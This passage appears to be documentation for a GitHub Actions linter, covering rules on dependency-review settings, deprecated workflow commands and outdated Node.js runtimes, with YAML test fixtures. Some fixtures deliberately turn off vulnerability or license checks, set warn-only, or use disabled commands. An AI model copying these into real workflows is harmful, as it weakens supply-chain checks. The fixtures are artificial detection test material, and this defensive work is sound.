## dependency-review-settings

- problem: a step of actions/dependency-review-action turns off a check of the action, or asks for a pull request comment that the GITHUB_TOKEN of the job cannot write
- expected: the step checks vulnerabilities and the license policy written for the step, fails when a check finds a problem, and asks for a comment only when the job has pull-requests: write
- targets: workflow
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- dependency-review-settings.comment-without-permission
  - detected: the step asks to write the summary of the dependency review as a comment on the pull request, but the GITHUB_TOKEN of the job is not given pull-requests: write
  - consequence: the comment is not written: the step warns and succeeds
  - remedy: give the job pull-requests: write, or set comment-summary-in-pr to never
  - fact kinds: repo.default-token-write
  - true positives:
    - comment-without-permission.default-token.yml (workflow, true-positive)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   comment-summary-in-pr: on-failure, and neither the workflow nor the job
      #   writes permissions; the repository's default token is read-only
      #   (repo.default-token-write is false).
      # reason: the GITHUB_TOKEN may not write pull-requests, so the comment is
      #   refused when the review fails.
      on: pull_request
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                comment-summary-in-pr: on-failure
      ```
    - comment-without-permission.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/dependency-review-settings-remote, which the
      #   fact workflow.definition answers with the workflow of the true positive
      #   comment-without-permission
      #   (comment-without-permission.default-token.yml) of the rule, with on:
      #   workflow_call in place of the on of
      #   comment-without-permission.default-token.yml. The job passes its secrets
      #   with secrets: inherit. In the true positive, a pull request runs
      #   actions/dependency-review-action with comment-summary-in-pr: on-failure,
      #   and neither the workflow nor the job writes permissions; the
      #   repository's default token is read-only (repo.default-token-write is
      #   false).
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: the
      #   GITHUB_TOKEN may not write pull-requests, so the comment is refused when
      #   the review fails.
      on: pull_request
      jobs:
        c:
          uses: example-org/dependency-review-settings-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - comment-without-permission.yml (workflow, true-positive)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   comment-summary-in-pr: always, under permissions that give contents: read
      #   only.
      # reason: the GITHUB_TOKEN is not given pull-requests: write, so GitHub
      #   refuses the comment of the action; the step warns and succeeds, and no
      #   summary is written.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                comment-summary-in-pr: always
      ```
  - true negatives:
    - comment-without-permission.yml (workflow, true-negative)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   comment-summary-in-pr: always, and the job writes pull-requests: write.
      # reason: the GITHUB_TOKEN may write the comment.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          permissions:
            contents: read
            pull-requests: write
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                comment-summary-in-pr: always
      ```
- dependency-review-settings.license-policy-off
  - detected: license-check is false, so the license policy written is not checked
  - consequence: dependencies with a denied license, or with a license that is not in the allowed list, pass the review
  - remedy: remove license-check: false, or remove the license policy
  - true positives:
    - license-policy-off.yml (workflow, true-positive)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   license-check: false and deny-licenses: GPL-3.0.
      # reason: the action does not check licenses, so the denied license is
      #   not looked at and a dependency under GPL-3.0 passes.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                license-check: false
                deny-licenses: GPL-3.0
      ```
  - true negatives:
    - license-policy-off.yml (workflow, true-negative)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   license-check: false and no license policy.
      # reason: no policy is written that the setting would turn off: the
      #   workflow does not use the license check.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                license-check: false
      ```
- dependency-review-settings.vulnerability-check-off
  - detected: vulnerability-check is false
  - consequence: dependencies with known vulnerabilities pass the review
  - remedy: remove vulnerability-check: false
  - true positives:
    - vulnerability-check-off.yml (workflow, true-positive)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   vulnerability-check: false.
      # reason: the action does not check the vulnerabilities of the dependencies
      #   the pull request adds, so one with a known vulnerability passes.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                vulnerability-check: false
      ```
  - true negatives:
    - vulnerability-check-off.yml (workflow, true-negative)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   vulnerability-check: disable.
      # reason: the action reads the input as a boolean of the YAML core schema
      #   and fails on disable, so the check is not turned off: the step fails.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                vulnerability-check: disable
      ```
- dependency-review-settings.warn-only
  - detected: warn-only is true
  - consequence: vulnerabilities and license violations only warn: the step succeeds, and a required check does not stop the pull request
  - remedy: remove warn-only: true; fail-on-severity sets the lowest severity that fails the step
  - true positives:
    - warn-only.yml (workflow, true-positive)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   warn-only: true.
      # reason: with warn-only, the action logs vulnerabilities and license
      #   violations as warnings and completes with success, so the check never
      #   fails, and a branch protection that requires the check stops no pull
      #   request.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                warn-only: true
      ```
  - true negatives:
    - warn-only.yml (workflow, true-negative)
      ```yaml
      # situation: a pull request runs actions/dependency-review-action with
      #   warn-only: false and fail-on-severity: high.
      # reason: the step fails on a dependency with a vulnerability of high
      #   severity or more, so a required check stops the pull request.
      on: pull_request
      permissions: {contents: read}
      jobs:
        review:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - uses: actions/dependency-review-action@v4
              with:
                warn-only: false
                fail-on-severity: high
      ```

### undetected forms

- config-file: a setting written in the file that config-file names; the with of the step overrides the file, and the rule does not read the file
  - finding kinds: dependency-review-settings.comment-without-permission, dependency-review-settings.license-policy-off, dependency-review-settings.vulnerability-check-off, dependency-review-settings.warn-only
  - disposition: todo (needs: repo-file, fact)
  - example: config-file.yml (workflow, undetected)
    ```yaml
    # situation: actions/dependency-review-action reads settings from the file
    #   that config-file names, and the file may say warn-only: true.
    # reason: a setting of the file that the with does not override applies, and
    #   warn-only in the file makes the check succeed whatever the check finds.
    # cause: the rule reads the with of the step only, not the file.
    on: pull_request
    permissions: {contents: read}
    jobs:
      review:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/dependency-review-action@v4
            with:
              config-file: ./.github/dependency-review-config.yml
    ```
- expression-value: a value of the with written as a \${{ }}, whose result is known only when the workflow runs
  - finding kinds: dependency-review-settings.comment-without-permission, dependency-review-settings.license-policy-off, dependency-review-settings.vulnerability-check-off, dependency-review-settings.warn-only
  - disposition: todo (needs: same-file)
  - example: expression-value.yml (workflow, undetected)
    ```yaml
    # situation: warn-only is written as a ${{ }} of a variable of the
    #   repository.
    # reason: when the variable is true, the check succeeds whatever the check
    #   finds.
    # cause: the value is known only when the workflow runs; the rule reads
    #   values written without ${{ }}.
    on: pull_request
    permissions: {contents: read}
    jobs:
      review:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/dependency-review-action@v4
            with:
              warn-only: ${{ vars.REVIEW_WARN_ONLY }}
    ```
- fork-pull-request: a comment asked for with pull-requests: write, in the run of a pull request from a fork; GitHub can give such a run a GITHUB_TOKEN that only reads, and then the step cannot write the comment
  - finding kinds: dependency-review-settings.comment-without-permission, dependency-review-settings.license-policy-off, dependency-review-settings.vulnerability-check-off, dependency-review-settings.warn-only
  - disposition: todo (needs: fact)
  - example: fork-pull-request.yml (workflow, undetected)
    ```yaml
    # situation: the job writes pull-requests: write and asks for the comment;
    #   the workflow runs on pull requests, and pull requests from forks are among
    #   them.
    # reason: GitHub can give the run of a pull request from a fork a token that
    #   cannot write the comment, whatever the permissions say; the behavior was
    #   not checked on GitHub.
    # cause: the rule reads the permissions written, not the token of a run from
    #   a fork.
    on: pull_request
    jobs:
      review:
        runs-on: ubuntu-latest
        permissions:
          contents: read
          pull-requests: write
        steps:
          - uses: actions/checkout@v4
          - uses: actions/dependency-review-action@v4
            with:
              comment-summary-in-pr: always
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: dependency-review-settings.comment-without-permission, dependency-review-settings.license-policy-off, dependency-review-settings.vulnerability-check-off, dependency-review-settings.warn-only
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/dependency-review-settings-unanswered, whose
    #   content is the workflow of the true positive comment-without-permission
    #   (comment-without-permission.default-token.yml) of the rule, with on:
    #   workflow_call in place of the on of
    #   comment-without-permission.default-token.yml. The linter has no answer
    #   of the fact workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    on: pull_request
    permissions: {}
    jobs:
      c:
        uses: example-org/dependency-review-settings-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- old-version: a version of the action that does not read the input: warn-only before v4.1.0, comment-summary-in-pr before v3.0.4, vulnerability-check and license-check before v3.0.0
  - finding kinds: dependency-review-settings.comment-without-permission, dependency-review-settings.license-policy-off, dependency-review-settings.vulnerability-check-off, dependency-review-settings.warn-only
  - disposition: todo (needs: fact)
  - example: old-version.yml (workflow, false-positive)
    ```yaml
    # situation: the step uses v3 of actions/dependency-review-action with
    #   warn-only: true.
    # reason: v3 does not read warn-only (the input came in v4.1.0), so the
    #   runner warns of an unexpected input, and the check fails when the check
    #   finds a vulnerability.
    # cause: the rule does not read the version of the action.
    on: pull_request
    permissions: {contents: read}
    jobs:
      review:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - uses: actions/dependency-review-action@v3
            with:
              warn-only: true
    ```

## deprecated-commands

- problem: the run script of a step prints to the log of the step, as ::name at the head of a line or ##&#91;name anywhere in a line (such as ##&#91;set-output name=x;]v), a workflow command that GitHub deprecated (set-output, save-state) or disabled (set-env, add-path)
- expected: every run script that sets an output, state, an environment variable or the PATH writes to the environment files (\$GITHUB_OUTPUT, \$GITHUB_STATE, \$GITHUB_ENV, \$GITHUB_PATH) instead of printing a workflow command
- targets: workflow, action-metadata
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- deprecated-commands.deprecated-command
  - detected: the run script of the step prints the workflow command {command}, which GitHub deprecated
  - arguments:
    - {command}: The command: set-output or save-state.
  - consequence: the runner adds a warning to each run of the workflow that runs the step. GitHub planned to disable both commands on 2023-05-31, and the notice of 2023-07-24 postponed the date without a new date. For set-output: once GitHub disables set-output, the step sets no output. For save-state: only the post step of the same action reads the state, and a run script has no post step, so no step reads the state that a run script saves
  - remedy: for set-output, write name=value to the file \$GITHUB_OUTPUT; for a value of many lines, write the line name&lt;&lt;DELIM, the lines of the value and the line DELIM, where DELIM is a random text that the value does not contain. For save-state, remove the command, because no step reads the state that a run script saves
  - true positives:
    - deprecated-command.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/deprecated-commands-remote, which the fact
      #   workflow.definition answers with the workflow of the true positive
      #   deprecated-command (deprecated-command.yml) of the rule, with on:
      #   workflow_call in place of the on of deprecated-command.yml. The job
      #   passes its secrets with secrets: inherit. In the true positive, a step
      #   sets its output version with the workflow command ::set-output.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: the
      #   runner adds a warning to every run of the step, and the step sets no
      #   output once GitHub disables set-output, which GitHub planned and
      #   postponed.
      on: push
      permissions: {contents: read}
      jobs:
        c:
          uses: example-org/deprecated-commands-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - deprecated-command.yml (workflow, true-positive)
      ```yaml
      # situation: a step sets its output version with the workflow command
      #   ::set-output.
      # reason: the runner adds a warning to every run of the step, and the step
      #   sets no output once GitHub disables set-output, which GitHub planned and
      #   postponed.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - id: version
              run: echo "::set-output name=version::$(cat VERSION)"
            - run: echo "building ${{ steps.version.outputs.version }}"
      ```
  - true negatives:
    - deprecated-command.yml (workflow, true-negative)
      ```yaml
      # situation: a step sets its output version in the file $GITHUB_OUTPUT.
      # reason: the environment file is what GitHub asks for, and the runner adds
      #   no warning.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - id: version
              run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"
            - run: echo "building ${{ steps.version.outputs.version }}"
      ```
- deprecated-commands.disabled-command
  - detected: the run script of the step prints the workflow command {command}, which GitHub disabled
  - arguments:
    - {command}: The command: set-env or add-path.
  - consequence: when ACTIONS_ALLOW_UNSECURE_COMMANDS is not true for the step, the runner fails the step. When ACTIONS_ALLOW_UNSECURE_COMMANDS is true, the command works, and each line that the step prints as a set-env or add-path command sets the environment variables or the PATH of the later steps; a value of an attacker that such a step prints is reported by the rule unsecure-commands
  - remedy: write name=value to the file \$GITHUB_ENV for set-env, or the directory to the file \$GITHUB_PATH for add-path, and remove ACTIONS_ALLOW_UNSECURE_COMMANDS
  - true positives:
    - disabled-command.yml (workflow, true-positive)
      ```yaml
      # situation: a step adds a directory to the PATH with the workflow command
      #   ::add-path::, and the job does not set ACTIONS_ALLOW_UNSECURE_COMMANDS.
      # reason: GitHub disabled add-path: the runner fails the step.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: echo "::add-path::$HOME/.local/bin"
            - run: tool --version
      ```
  - true negatives:
    - disabled-command.yml (workflow, true-negative)
      ```yaml
      # situation: a step writes the text ::set-env name=A::b to a file, and a
      #   comment of the run has ::add-path::.
      # reason: neither reaches the log of the step, and the runner reads no
      #   workflow command in them.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          timeout-minutes: 10
          steps:
            - run: |
                # ::add-path:: is disabled, so this step writes $GITHUB_PATH
                echo "::set-env name=A::b" > notes.txt
                echo "$HOME/.local/bin" >> "$GITHUB_PATH"
      ```

### undetected forms

- other-output: a workflow command that a command other than echo, printf and cat prints, such as python -c in the run script or a script file of the repository, and a line that echo makes from an escape (echo -e with \\n) or from the output of a \$( ) in its words: the rule reads the literal text that echo, printf and cat print
  - finding kinds: deprecated-commands.deprecated-command, deprecated-commands.disabled-command
  - disposition: todo (needs: same-file, repo-file)
  - example: other-output.yml (workflow, undetected)
    ```yaml
    # situation: a step runs a script of the repository, which prints
    #   ::set-output name=version::1.0.0.
    # reason: a todo (a file of the repository): the runner adds a warning, and
    #   the step sets no output once GitHub disables set-output.
    # cause: the rule reads the text of the run, not the script it runs.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - id: version
            run: ./scripts/version.sh
    ```
- action-output: a workflow command that the code of an action prints, such as setOutput of an old version of @actions/core: the rule reads the run scripts of bash and sh
  - finding kinds: deprecated-commands.deprecated-command, deprecated-commands.disabled-command
  - disposition: limitation (decided by: run-time)
  - example: action-output.yml (workflow, undetected)
    ```yaml
    # situation: a step uses an old JavaScript action whose @actions/core
    #   writes outputs with ::set-output.
    # reason: a limitation (run time): the runner adds a warning, and the step
    #   sets no output once GitHub disables set-output.
    # cause: the rule reads the runs of bash and sh, not the code of actions.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - id: meta
            uses: example-org/old-metadata-action@v1
          - run: echo "${{ steps.meta.outputs.tags }}"
    ```
- dynamic-command: a workflow command whose name comes from a variable or a \${{ }}: the rule reads a name written in the text of the run script
  - finding kinds: deprecated-commands.deprecated-command, deprecated-commands.disabled-command
  - disposition: todo (needs: same-file)
  - example: dynamic-command.yml (workflow, undetected)
    ```yaml
    # situation: a step prints a workflow command whose name is in a variable,
    #   set-output.
    # reason: a todo (the same file): the runner reads ::set-output and adds a
    #   warning.
    # cause: the rule reads a name written in the text of the run, not the
    #   value of a variable.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - id: version
            run: |
              cmd=set-output
              echo "::$cmd name=version::1.0.0"
    ```
- other-shell: a workflow command that a run script of another shell than bash or sh prints, such as pwsh, and one of a run script whose shell the rule does not decide: a step without shell: on a runner that runs-on names by a label other than a label of a GitHub-hosted runner, a step whose shell: value is bash or sh with an option that the rule does not read, such as bash -v {0}, and a step whose shell: value names bash or sh by a path on a runner that the rule does not know to have the path
  - finding kinds: deprecated-commands.deprecated-command, deprecated-commands.disabled-command
  - disposition: todo (needs: same-file)
  - example: other-shell.yml (workflow, undetected)
    ```yaml
    # situation: a step of pwsh prints ::set-output.
    # reason: a todo (the same file): the runner reads the line of the log as
    #   set-output and adds a warning.
    # cause: the rule reads the runs of bash and sh.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: windows-latest
        timeout-minutes: 10
        steps:
          - id: version
            shell: pwsh
            run: Write-Output "::set-output name=version::1.0.0"
    ```
- remote-callee: a job or a step inside a reusable workflow of another repository (uses: owner/repo/.github/workflows/&lt;file>@&lt;ref>) whose content the fact workflow.definition does not give. For every rule: a run that does not ask the fact (a run without --online and without the answer in --facts). For a quality rule, also: a run where the linter asked the fact and got no answer (an answer of unknown: the GitHub API did not give the file), and a call deeper than the 3 levels of reusable workflows that the linter reads, for which the linter does not ask the fact. The rule reads a reusable workflow of another repository only from the answer of workflow.definition. For a rule that is not a quality rule (a rule with a threat), the last two forms are the inconclusive kind remote-callee-unknown, not this form
  - finding kinds: deprecated-commands.deprecated-command, deprecated-commands.disabled-command
  - disposition: todo (needs: fact)
  - example: remote-callee.yml (workflow, undetected)
    ```yaml
    # situation: a job calls the reusable workflow .github/workflows/w.yml of
    #   the repository example-org/deprecated-commands-unanswered, whose content
    #   is the workflow of the true positive deprecated-command
    #   (deprecated-command.yml) of the rule, with on: workflow_call in place of
    #   the on of deprecated-command.yml. The linter has no answer of the fact
    #   workflow.definition for the reusable workflow.
    # reason: a todo (a fact): the jobs of a reusable workflow run on the event
    #   that started the run of the calling job, and the linter does not read
    #   the reusable workflow.
    # cause: the rule reads a reusable workflow of another repository only from
    #   the answer of workflow.definition.
    on: push
    permissions: {}
    jobs:
      c:
        uses: example-org/deprecated-commands-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```

### false positive forms

- stopped-commands: a workflow command printed after ::stop-commands:: and before the token that ends the stop: the runner reads no workflow command between the two
  - finding kinds: deprecated-commands.deprecated-command, deprecated-commands.disabled-command
  - disposition: todo (needs: same-file)
  - example: stopped-commands.yml (workflow, false-positive)
    ```yaml
    # situation: a step prints a file of notes between ::stop-commands:: and
    #   the token that ends the stop, and a line of the notes is
    #   ::set-output name=a::b.
    # reason: the runner reads no workflow command between the two, and the
    #   line is text of the log.
    # cause: the rule does not read ::stop-commands::.
    on: push
    permissions: {contents: read}
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        steps:
          - run: |
              token=$(uuidgen)
              echo "::stop-commands::$token"
              echo "::set-output name=a::b"
              echo "::$token::"
    ```

### citations

- <https://github.blog/changelog/2022-10-11-github-actions-deprecating-save-state-and-set-output-commands/>
- <https://github.blog/changelog/2023-07-24-github-actions-update-on-save-state-and-set-output-commands/>
- <https://github.com/github/docs/blob/44a609d0382839fdfe455de859774cfebb7f2d83/content/actions/reference/workflows-and-actions/workflow-commands.md>
- <https://github.com/actions/runner/blob/v2.337.0/src/Runner.Worker/ActionCommandManager.cs>

## deprecated-node-runtime

- problem: an action.yml of the repository, or an action of another repository that a step uses, declares an older Node.js version than node24; an env sets a setting of the Node.js version of actions; or actions/setup-node sets up a Node.js version whose support ended
- expected: every JavaScript action (an action whose runs.using names a Node.js version) declares runs.using: node24 or later; no env sets ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION or FORCE_JAVASCRIPT_ACTIONS_TO_NODE20; and the node-version of actions/setup-node names a Node.js version that is still supported
- targets: workflow, action-metadata
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: facts: the rule runs, with all its kinds of findings (also those that need no fact), when --rule names the rule; in a run without --rule, the rule runs when --online is given, or when --facts or --fact gives a found or absent answer to any fact of action.runs-using

### finding kinds

- deprecated-node-runtime.declared-runtime
  - detected: the action declares runs.using: {runs_using}, an older Node.js version than node24
  - arguments:
    - {runs_using}: runs.using, as written.
  - consequence: GitHub-hosted runners run the action on Node.js 24 (seen on 2026-10-20), not on the Node.js version that the action declares, and add a warning to every run of every job that uses the action; code of the action that depends on the declared Node.js version may behave differently on Node.js 24
  - remedy: change runs.using to node24, and test the action on Node.js 24
  - true positives:
    - declared-runtime.action.yml (action-metadata, true-positive)
      ```yaml
      # situation: a JavaScript action of the repository declares runs.using:
      #   node20.
      # reason: the runner runs the action on Node.js 24, not on Node.js 20, and
      #   adds a warning to every job that uses the action; code of the action
      #   that depends on Node.js 20 may behave differently.
      name: build-info
      description: prints the build information
      runs:
        using: node20
        main: dist/index.js
      ```
  - true negatives:
    - declared-runtime.action.yml (action-metadata, true-negative)
      ```yaml
      # situation: a JavaScript action of the repository declares runs.using:
      #   node24.
      # reason: the runner runs the action on the Node.js version that the action
      #   declares.
      name: build-info
      description: prints the build information
      runs:
        using: node24
        main: dist/index.js
      ```
- deprecated-node-runtime.eol-node-version
  - detected: node-version {node_version} names Node.js {major}, whose support ended on {end_of_life}
  - arguments:
    - {node_version}: node-version, as written.
    - {major}: The major version of Node.js that node-version names, as the schedule of Node.js names the major version: 0.12 for a version before 4.
    - {end_of_life}: The day the support of the major version ended, as the schedule of Node.js gives the day.
  - consequence: the steps after actions/setup-node run their commands on a Node.js version that no longer gets security fixes
  - remedy: set node-version to a Node.js version that is still supported
  - true positives:
    - eol-node-version.remote-callee.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls the reusable workflow .github/workflows/w.yml of
      #   the repository example-org/deprecated-node-runtime-remote, which the
      #   fact workflow.definition answers with the workflow of the true positive
      #   eol-node-version (eol-node-version.yml) of the rule, with on:
      #   workflow_call in place of the on of eol-node-version.yml. The job passes
      #   its secrets with secrets: inherit. In the true positive, a workflow
      #   builds and tests a project on Node.js 20 with actions/setup-node.
      # reason: the jobs of a reusable workflow run on the event that started the
      #   run of the calling job, so the reason of the true positive holds: the
      #   support of Node.js 20 ended on 2026-04-30, so the build and the tests
      #   run on a Node.js version that no longer gets security fixes.
      on: push
      permissions: {contents: read}
      jobs:
        c:
          uses: example-org/deprecated-node-runtime-remote/.github/workflows/w.yml@v1
          secrets: inherit
      ```
    - eol-node-version.yml (workflow, true-positive)
      ```yaml
      # situation: a workflow builds and tests a project on Node.js 20 with
      #   actions/setup-node.
      # reason: the support of Node.js 20 ended on 2026-04-30, so the build and
      #   the tests run on a Node.js version that no longer gets security fixes.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/setup-node@v5
              with:
                node-version: 20
            - run: npm test
      ```
  - true negatives:
    - eol-node-version.yml (workflow, true-negative)
      ```yaml
      # situation: a workflow builds and tests a project on Node.js 24 with
      #   actions/setup-node.
      # reason: Node.js 24 is supported until 2028-04-30.
      on: push
      permissions: {contents: read}
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/setup-node@v5
              with:
                node-version: 24
            - run: npm test
      ```
- deprecated-node-runtime.runtime-setting
  - detected: the env sets {name}, a setting of the Node.js version that runs actions; the setting is reported whatever its value
  - arguments:
    - {name}: The key, as written.
  - consequence: GitHub-hosted runners do not obey the setting (seen on 2026-10-20) and run an action that declares node12, node16 or node20 on Node.js 24, so the setting does nothing there; on a runner that obeys ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION with the value true, the actions that declare node12, node16 or node20 run on Node.js 20, which no longer gets security fixes
  - remedy: remove the setting; for an action that declares node12, node16 or node20, use a version of the action whose runs.using is node24
  - true positives:
    - runtime-setting.yml (workflow, true-positive)
      ```yaml
      # situation: a workflow sets ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION in the
      #   env of a job, to keep an action that declares node20 on Node.js 20.
      # reason: the runners of GitHub no longer obey the setting and run the
      #   action on Node.js 24, so the setting does nothing there; a runner that
      #   obeys the setting runs the action on Node.js 20, which no longer gets
      #   security fixes.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          env:
            ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION: 'true'
          steps:
            - run: make
      ```
  - true negatives:
    - runtime-setting.yml (workflow, true-negative)
      ```yaml
      # situation: a workflow sets NODE_OPTIONS in the env of a job.
      # reason: NODE_OPTIONS sets the options of the Node.js process of the steps;
      #   NODE_OPTIONS is not a setting of the Node.js version that runs actions.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          env:
            NODE_OPTIONS: --max-old-space-size=4096
          steps:
            - run: make
      ```
- deprecated-node-runtime.used-action
  - detected: the action {uses} declares runs.using: {runs_using}, an older Node.js version than node24
  - arguments:
    - {uses}: The uses, as written.
    - {runs_using}: The runs.using of the action, as the fact action.runs-using answers; node12, node16 or node20 when the fact has no answer, and the finding is then conditional.
  - consequence: GitHub-hosted runners run the action on Node.js 24 (seen on 2026-10-20), not on the Node.js version that the action declares, and add a warning to every run of every job that uses the action; code of the action that depends on the declared Node.js version may behave differently on Node.js 24
  - remedy: use a version of the action whose runs.using is node24, ask the maintainer of the action for such a version, or replace the action with one that is maintained
  - fact kinds: action.runs-using
  - true positives:
    - used-action.remote-called.yml (workflow, true-positive)
      ```yaml
      # situation: a job calls example-org/release-workflow/.github/workflows/release.yml@v1,
      #   a reusable workflow of another repository whose step uses
      #   actions/create-release@v1, which declares node12.
      # reason: the runner runs the action on a newer Node than it declares, or
      #   fails the step when that Node is gone; workflow.definition answers the
      #   file of the called workflow.
      on: push
      jobs:
        release:
          uses: example-org/release-workflow/.github/workflows/release.yml@v1
      ```
    - used-action.remote-composite.yml (workflow, true-positive)
      ```yaml
      # situation: a workflow runs example-org/node-composite@v1, a composite
      #   action of another repository, and a step of that composite action uses
      #   actions/create-release@v1, whose action.yml declares runs.using: node12.
      # reason: the runner runs the inner action on Node.js 24, not on Node.js
      #   12, and adds a warning to the job; action.definition answers the file
      #   of the composite action, as the archive the runner downloads has it.
      on: push
      permissions: {contents: write}
      jobs:
        release:
          runs-on: ubuntu-latest
          steps:
            - uses: example-org/node-composite@v1
      ```
    - used-action.yml (workflow, true-positive)
      ```yaml
      # situation: a workflow makes a GitHub release with
      #   actions/create-release@v1, whose action.yml declares runs.using: node12.
      # reason: the runner runs the action on Node.js 24, not on Node.js 12, and
      #   adds a warning to the job; code of the action that depends on Node.js
      #   12 may behave differently.
      on: push
      permissions: {contents: write}
      jobs:
        release:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/create-release@v1
              with:
                tag_name: v1.0.0
              env:
                GITHUB_TOKEN: ${{ github.token }}
      ```
  - true negatives:
    - used-action.remote-composite.yml (workflow, true-negative)
      ```yaml
      # situation: a workflow runs example-org/current-composite@v1, a composite
      #   action of another repository, whose step uses actions/checkout@v4,
      #   which declares runs.using: node24.
      # reason: every action the composite action runs declares node24, which
      #   the runner runs as it is.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: example-org/current-composite@v1
      ```
    - used-action.yml (workflow, true-negative)
      ```yaml
      # situation: a workflow checks out its repository with actions/checkout@v5,
      #   whose action.yml declares runs.using: node24.
      # reason: the runner runs the action on the Node.js version that the action
      #   declares.
      on: push
      permissions: {contents: read}
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v5
              with:
                persist-credentials: false
      ```

### undetected forms

